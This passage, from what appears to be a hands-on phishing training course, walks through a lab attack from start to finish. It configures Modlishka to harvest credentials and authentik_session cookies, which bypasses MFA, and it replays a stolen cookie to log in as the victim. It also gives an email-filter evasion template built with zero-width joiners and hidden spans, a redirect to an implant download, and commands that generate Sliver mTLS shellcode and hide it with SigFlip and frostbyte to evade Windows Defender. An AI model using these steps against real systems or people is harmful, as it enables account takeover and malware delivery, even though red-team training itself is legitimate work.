</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__USE_TLS</span><span class=o>=</span><span class=nb>false</span>
</span></span><span class=line><span class=cl><span class=c1># Use SSL</span>
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__USE_SSL</span><span class=o>=</span><span class=nb>false</span>
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__TIMEOUT</span><span class=o>=</span><span class=m>10</span>
</span></span><span class=line><span class=cl><span class=c1># Email address authentik will send from, should have a correct @domain</span>
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__FROM</span><span class=o>=</span>authentik@target.docker
</span></span></code></pre></div><p>Now we&rsquo;ll merge their <code>docker-compose.yml</code> with ours (<a href=https://goauthentik.io/docs/installation/docker-compose>ref</a>). We&rsquo;ll start with the services.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>authentik-postgresql</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>docker.io/library/postgres:12-alpine</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>restart</span><span class=p>:</span><span class=w> </span><span class=l>unless-stopped</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>healthcheck</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>test</span><span class=p>:</span><span class=w> </span><span class=p>[</span><span class=s2>&#34;CMD-SHELL&#34;</span><span class=p>,</span><span class=w> </span><span class=s2>&#34;pg_isready -d $${POSTGRES_DB} -U $${POSTGRES_USER}&#34;</span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>start_period</span><span class=p>:</span><span class=w> </span><span class=l>20s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>interval</span><span class=p>:</span><span class=w> </span><span class=l>30s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>retries</span><span class=p>:</span><span class=w> </span><span class=m>5</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>timeout</span><span class=p>:</span><span class=w> </span><span class=l>5s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>database:/var/lib/postgresql/data</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>environment</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>POSTGRES_PASSWORD=${PG_PASS:?database password required}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>POSTGRES_USER=${PG_USER:-authentik}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>POSTGRES_DB=${PG_DB:-authentik}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>env_file</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>.env</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>authentik-redis</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>docker.io/library/redis:alpine</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>command</span><span class=p>:</span><span class=w> </span>--<span class=l>save 60 1 --loglevel warning</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>restart</span><span class=p>:</span><span class=w> </span><span class=l>unless-stopped</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>healthcheck</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>test</span><span class=p>:</span><span class=w> </span><span class=p>[</span><span class=s2>&#34;CMD-SHELL&#34;</span><span class=p>,</span><span class=w> </span><span class=s2>&#34;redis-cli ping | grep PONG&#34;</span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>start_period</span><span class=p>:</span><span class=w> </span><span class=l>20s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>interval</span><span class=p>:</span><span class=w> </span><span class=l>30s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>retries</span><span class=p>:</span><span class=w> </span><span class=m>5</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>timeout</span><span class=p>:</span><span class=w> </span><span class=l>3s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>redis:/data</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>authentik-server</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2023.3.1}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>restart</span><span class=p>:</span><span class=w> </span><span class=l>unless-stopped</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>command</span><span class=p>:</span><span class=w> </span><span class=l>server</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>environment</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>VIRTUAL_HOST</span><span class=p>:</span><span class=w> </span><span class=l>target.docker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_REDIS__HOST</span><span class=p>:</span><span class=w> </span><span class=l>authentik-redis</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__HOST</span><span class=p>:</span><span class=w>  </span><span class=l>authentik-postgresql</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__USER</span><span class=p>:</span><span class=w> </span><span class=l>${PG_USER:-authentik}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__NAME</span><span class=p>:</span><span class=w> </span><span class=l>${PG_DB:-authentik}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__PASSWORD</span><span class=p>:</span><span class=w> </span><span class=l>${PG_PASS}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./authentik/media:/media</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./authentik/custom-templates:/templates</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>env_file</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>.env</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>ports</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;${AUTHENTIK_PORT_HTTP:-9000}:9000&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;${AUTHENTIK_PORT_HTTPS:-9443}:9443&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>authentik-worker</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2023.3.1}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>restart</span><span class=p>:</span><span class=w> </span><span class=l>unless-stopped</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>command</span><span class=p>:</span><span class=w> </span><span class=l>worker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>environment</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_REDIS__HOST</span><span class=p>:</span><span class=w> </span><span class=l>authentik-redis</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__HOST</span><span class=p>:</span><span class=w> </span><span class=l>authentik-postgresql</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__USER</span><span class=p>:</span><span class=w> </span><span class=l>${PG_USER:-authentik}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__NAME</span><span class=p>:</span><span class=w> </span><span class=l>${PG_DB:-authentik}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>AUTHENTIK_POSTGRESQL__PASSWORD</span><span class=p>:</span><span class=w> </span><span class=l>${PG_PASS}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># `user: root` and the docker socket volume are optional.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># See more for the docker socket integration here:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># https://goauthentik.io/docs/outposts/integrations/docker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># Removing `user: root` also prevents the worker from fixing the permissions</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># on the mounted folders, so when removing this make sure the folders have the correct UID/GID</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># (1000:1000 by default)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>user</span><span class=p>:</span><span class=w> </span><span class=l>root</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>/var/run/docker.sock:/var/run/docker.sock</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./authentik/media:/media</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./authentik/certs:/certs</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./authentik/custom-templates:/templates</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>env_file</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>.env</span><span class=w>
</span></span></span></code></pre></div><p>We also need to update our volumes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>database</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>driver</span><span class=p>:</span><span class=w> </span><span class=l>local</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>redis</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>driver</span><span class=p>:</span><span class=w> </span><span class=l>local</span><span class=w>
</span></span></span></code></pre></div><p>Test it out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker compose up
</span></span></code></pre></div><p>Now open <a href=http://auth.target.docker:9000/if/flow/initial-setup/>http://auth.target.docker:9000/if/flow/initial-setup/</a>. We should see a simple setup page.</p><p><img src=/static/how-to-phishing/authentik-admin-setup.png alt="Authentik Admin Setup"></p><h2 id=setup-mfa>Setup MFA<a class=td-heading-self-link href=#setup-mfa aria-label="Heading self-link"></a></h2><p><img src=/static/how-to-phishing/authentik-admin-add-mfa.png alt="Authentik Admin Add MFA"></p></div><div class=td-content style=page-break-before:always><h1 id=pg-9dd9096a9148e11227a382d2b3b48ee9>21 - Reconfigure Modlishka With MFA Authentication Provider</h1><p>Let&rsquo;s go through the authentication flow to determine what the username and password fields when conducting a normal login. First thing we want to do is open developer tools and ensure <code>Persist Logs</code> is checked.</p><p><img src=/static/how-to-phishing/authentik-devtools-persist-logs.png alt="Persist Logs"></p><p>Now we can fill out the username field, press login, then look for the POST request.</p><p><img src=/static/how-to-phishing/authentik-username-post-request.png alt="Username Request"></p><p>Fill out our password and do the same.</p><p><img src=/static/how-to-phishing/authentik-password-post-request.png alt="Password Request"></p><p>We can see that the fields are <code>uid_field</code> and <code>password</code>.</p><p>Now we need to find a URL path that is only hit when the target successfully logs in. Finish the authentication process by completing the MFA challenge.</p><p><img src=/static/how-to-phishing/authentik-login-success-request.png alt="Successful Login Request"></p><p>Lets use <code>/if/user</code>.</p><p>Now we need to determine the session cookie.</p><p><img src=/static/how-to-phishing/authentik-session-cookie.png alt="Authentik Session Cookie"></p><p>Looks like <code>authentik_session</code> maybe the one we are after. We are lucky they used descriptive names and very few cookies.</p><p>Since we are testing in a lab environment, we need to configure <code>modlishka</code> to allow connections to private IPs. Change <code>disableSecurity</code> to <code>true</code> in the <code>config.json</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=s2>&#34;disableSecurity&#34;</span><span class=err>:</span> <span class=kc>true</span><span class=err>,</span>
</span></span></code></pre></div><p>We have all the required information to reconfigure Modlishka. Now we need to start updating Modlishka configuration. We&rsquo;ll start with the <code>"target"</code> in Modlishka&rsquo;s configuration.</p><p>If you are in a live training, we&rsquo;ll want to configure are target to be the targets auth server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=s2>&#34;target&#34;</span><span class=err>:</span> <span class=s2>&#34;auth.snakshare.com&#34;</span><span class=err>,</span>
</span></span></code></pre></div><p>If not in a training this should be sufficient.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=s2>&#34;target&#34;</span><span class=err>:</span> <span class=s2>&#34;auth.target.docker:9000&#34;</span><span class=err>,</span>
</span></span></code></pre></div><p>Now we need to create some regular expressions to match the username and password fields.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s1>&#39;&#34;uid_field&#34;:\s*&#34;(.+?)&#34;&#39;</span> <span class=p>|</span> base64
</span></span><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s1>&#39;&#34;password&#34;:\s*&#34;(.+?)&#34;&#39;</span> <span class=p>|</span> base64
</span></span></code></pre></div><p><img src=/static/how-to-phishing/modlishka-config-cred-params-base64.png alt="Base64 Cred Params"></p><p>We&rsquo;ll join these two values together with a comma, then update the <code>"credParams"</code> configuration value.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=s2>&#34;credParams&#34;</span><span class=err>:</span> <span class=s2>&#34;InVpZF9maWVsZCI6XHMqIiguKz8pIg==,InBhc3N3b3JkIjpccyoiKC4rPyki&#34;</span>
</span></span></code></pre></div><p>Finally, we need to update the <code>"terminateTriggers"</code> and <code>"terminateRedirectUrl"</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=s2>&#34;terminateRedirectUrl&#34;</span><span class=err>:</span> <span class=s2>&#34;https://uvcyber.com/?phished&#34;</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;terminateTriggers&#34;</span><span class=err>:</span> <span class=s2>&#34;/if/user&#34;</span><span class=err>,</span>
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-d28f5e7074dad9b709eaea3f63bd3422>22 - Test Modlishka MFA Bypass</h1><p>Open up a new private browsing window, then visit <a href="http://modlishka.docker/?rid=test0001">http://modlishka.docker/?rid=test0001</a>. We&rsquo;ll make up a fake <code>rid</code> value to help us track our progress.</p><p><img src=/static/how-to-phishing/modlishka-mfa-landing.png alt="Modlishka MFA Login"></p><p>Go through the authentication flow. You can Modlishka seamlessly handles the redirects and the MFA authentication flow.</p><p><img src=/static/how-to-phishing/modlishka-auth-mfa-prompt.png alt="Modlishka MFA Prompt"></p><p>So we are stuck at a loading screen. this is because we hit the terminate trigger URL while loading a page.</p><p><img src=/static/how-to-phishing/modlishka-auth-success-loader.png alt="Modlishka Authentication Loading"></p><p>If we refresh the page we&rsquo;ll get redirected to our termination URL. Kind of jarring, but still acceptable.</p><p>Now that we&rsquo;ve completed our login, lets check out the Modlishka data. Open <a href=http://modlishka.docker/livewell/>http://modlishka.docker/livewell/</a>, login with the credentials we configured (<code>phisherman:phisherpass</code>).</p><p><img src=/static/how-to-phishing/modlishka-livewell.png alt="Modlishka Livewell"></p><p>Click <code>View Cookies</code> on our testing UUID.</p><p><img src=/static/how-to-phishing/modlishka-livewell-auth-cookie.png alt="Modlishka Livewell Authentication Cookie"></p><p>Now we can copy the value of the <code>authentik_session</code> cookie. Open <a href=http://auth.target.docker:9000>http://auth.target.docker:9000</a> in a new private browsing window, and update the cookie value using developer tools.</p><p><img src=/static/how-to-phishing/reuse-session-cookie.png alt="Replace Session Cookie to Current Session"></p><p>Once completed, visit the root URL again <a href=http://auth.target.docker:9000/>http://auth.target.docker:9000/</a></p><p><img src=/static/how-to-phishing/phished-admin-session.png alt="Phished Admin Session"></p><p>We are now logged in as the target.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-4885a40abc17e08a73adb3ce48afbeed>23 - Not So Basic Credential Harvesting</h1><p>Now we can go back to Gophish, clone our first credential harvesting campaign, modify the URL to point to Modlishka (<a href=http://modlishka.docker>http://modlishka.docker</a>).</p><p><img src=/static/how-to-phishing/not-so-basic-cred-harvesting-campaign.png alt="Gophish Campaign with MFA"></p><p>This will break Gophish&rsquo;s Opened, Clicked, and Data Captured analytics. We can fix those later, but for now we&rsquo;ll just keep moving forward.</p><p><img src=/static/how-to-phishing/mailhog-mfa-campaign.png alt="MailHog MFA Campaign"></p><p>If we click on it, we can see in our Modlishka livewell page, we can see our target&rsquo;s RID.</p><p><img src=/static/how-to-phishing/modlishka-livewell-gophish-rid.png alt="Modlishka Livewell Gophish RID"></p><p>Feel free to go through the whole flow. It shouldn&rsquo;t be any different from the previous step besides the fact we are opening the link from an email instead of directly browsing to it.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-cdf65d8781bbfc97d7695bc7209b2f6b>24 - Email Filtering Bypass</h1><h3 id=bypassing-email-filtering>Bypassing Email Filtering<a class=td-heading-self-link href=#bypassing-email-filtering aria-label="Heading self-link"></a></h3><p>A lot of times emails will be quarantined based on content. We can trick them by injecting invisible characters and html elements into our messages.</p><p>We can use a Zero Width Joiner <a href=https://emojipedia.org/zero-width-joiner/>ref</a> to assist in this. simply pasting the character in the middle of problematic words should do the trick.</p><p>We can also use the <code>&lt;span></code> HTML element to help us out by breaking up problematic words and phrases.</p><p>Text:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>All,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We are up‍grad‍ing the sec‍urity around our au‍thent‍ication serv‍ices. Please lo‍g‍in ({{.URL}}) to ena‍ble these new feat‍ures.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Tha‍nks
</span></span><span class=line><span class=cl>-
</span></span><span class=line><span class=cl>Guy Withaface
</span></span><span class=line><span class=cl>IT
</span></span></code></pre></div><p>You can&rsquo;t tell the difference just by looking at it. However, if we open it up in vim we can see the difference.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>All,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We are up&lt;200d&gt;grad&lt;200d&gt;ing the sec&lt;200d&gt;urity around our au&lt;200d&gt;thent&lt;200d&gt;ication serv&lt;200d&gt;ices. Please lo&lt;200d&gt;g&lt;200d&gt;in ({{.URL}}) to ena&lt;200d&gt;ble these new feat&lt;200d&gt;ures.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Tha&lt;200d&gt;nks
</span></span><span class=line><span class=cl>-
</span></span><span class=line><span class=cl>Guy Withaface
</span></span><span class=line><span class=cl>IT
</span></span></code></pre></div><p>HTML:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>All,<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>We are <span class=p>&lt;</span><span class=nt>span</span><span class=p>&gt;</span>up<span class=p>&lt;</span><span class=nt>span</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span>stairs searching for the holy<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>gr<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;</span><span class=nt>span</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span>rail and are f<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>ading the se<span class=p>&lt;</span><span class=nt>span</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span>earch for <span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;</span><span class=nt>span</span><span class=p>&gt;</span>cur<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;</span><span class=nt>span</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span>ry in the c<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>ity around our au<span class=p>&lt;</span><span class=nt>span</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span>dio and <span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;</span><span class=nt>span</span><span class=p>&gt;</span>then<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;</span><span class=nt>span</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span> have a pizza party<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>tication ser<span class=p>&lt;</span><span class=nt>span</span><span class=p>&gt;</span>vice<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>s. Please <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;{{.URL}}&#34;</span><span class=p>&gt;</span>lo<span class=p>&lt;</span><span class=nt>span</span><span class=p>&gt;</span>gin<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span> to en<span class=p>&lt;</span><span class=nt>span</span><span class=p>&gt;</span>able thes<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>e new features<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>.<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Thanks<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-439e83cf1cb84facea6bbcd48922799e>25 - Modlishka Terminate to Implant Download</h1><h3 id=terminate-to-implant-download>Terminate to implant download<a class=td-heading-self-link href=#terminate-to-implant-download aria-label="Heading self-link"></a></h3><p>We can set our terminationURL to a place where we are hosting our windows implant. This will require them to authenticate then be redirected to a file download page.</p><p>Add our newly generated payload to the NGINX container.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash></code></pre></div><p>Create a landing page html to be our termination URL. We can use this to execute some js to make sure the target is running windows before we download the file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html></code></pre></div><p>update modlishka&rsquo;s termination URL.</p><p>TODO: Screenshot</p><p>Test it out with Modlishkla</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker compose up
</span></span></code></pre></div><p>Create a new campaign and test it out.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-810e17e488d8482d435c2b196a7bb576>26 - Better Payload Generation</h1><h3 id=better-implants-frostbyte-bypass-windows-defender>Better implants (frostbyte bypass windows defender)<a class=td-heading-self-link href=#better-implants-frostbyte-bypass-windows-defender aria-label="Heading self-link"></a></h3><p>Instead of generating an executable. We can generate shellcode. We can then use something like <a href=https://github.com/pwn1sher/frostbyte>https://github.com/pwn1sher/frostbyte</a> to load that shellcode into memory and execute it.</p><h3 id=get-frostbyte>Get frostbyte<a class=td-heading-self-link href=#get-frostbyte aria-label="Heading self-link"></a></h3><p>Download the <a href=https://github.com/pwn1sher/frostbyte/archive/refs/heads/main.zip>frostbyte zip</a> from GitHub.</p><h3 id=generate-shellcode>Generate shellcode<a class=td-heading-self-link href=#generate-shellcode aria-label="Heading self-link"></a></h3><p>In a sliver shell we need to run the following to generate some shellcode to be used later. We&rsquo;ll use <code>test.example</code> as the callback domain, we will add an entry to the Windows hosts file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>generate --mtls test.example -f shellcode --save implants/shellcodex64.bin
</span></span></code></pre></div><p>Copy the shell code to the share.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p /share/operator-<span class=k>$(</span>ip a <span class=p>|</span> grep <span class=m>172</span> <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> cut -d/ -f1 <span class=p>|</span> cut -d. -f4<span class=k>)</span>
</span></span><span class=line><span class=cl>cp implants/shellcodex64.bin /share/operator-<span class=k>$(</span>ip a <span class=p>|</span> grep <span class=m>172</span> <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> cut -d/ -f1 <span class=p>|</span> cut -d. -f4<span class=k>)</span>
</span></span></code></pre></div><p>It is time to switch to windows.</p><p>Copy the shellcode to your <code>Desktop\frostbyte-main</code> folder on the Windows machine.</p><h3 id=setup-files-for-new-payload>Setup Files for New Payload<a class=td-heading-self-link href=#setup-files-for-new-payload aria-label="Heading self-link"></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl><span class=k>cd</span> Desktop\frostbyte-main
</span></span><span class=line><span class=cl><span class=k>mkdir</span> AuthHelper
</span></span><span class=line><span class=cl><span class=k>mkdir</span> AuthHelper\dist\
</span></span><span class=line><span class=cl><span class=k>copy</span> Update.exe.config AuthHelper\dist\AuthHelper.exe.config
</span></span><span class=line><span class=cl><span class=k>copy</span> test.cs AuthHelper\AuthHelper.cs
</span></span><span class=line><span class=cl><span class=k>cd</span> AuthHelper
</span></span></code></pre></div><h3 id=run-sigflip>Run SigFlip<a class=td-heading-self-link href=#run-sigflip aria-label="Heading self-link"></a></h3><p>Now that we have things setup we can run <code>SigFlip</code> to encode our shellcode into the <code>CasPol.exe</code> and save it as <code>AuthHelper.exe</code> in our newly created <code>AuthHelper</code> folder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>..\SigFlip.exe -i <span class=s2>&#34;..\CasPol.exe&#34;</span> <span class=s2>&#34;..\shellcodex64.bin&#34;</span> <span class=s2>&#34;.\dist\AuthHelper.exe&#34;</span> <span class=s2>&#34;PYLD4ME&#34;</span>
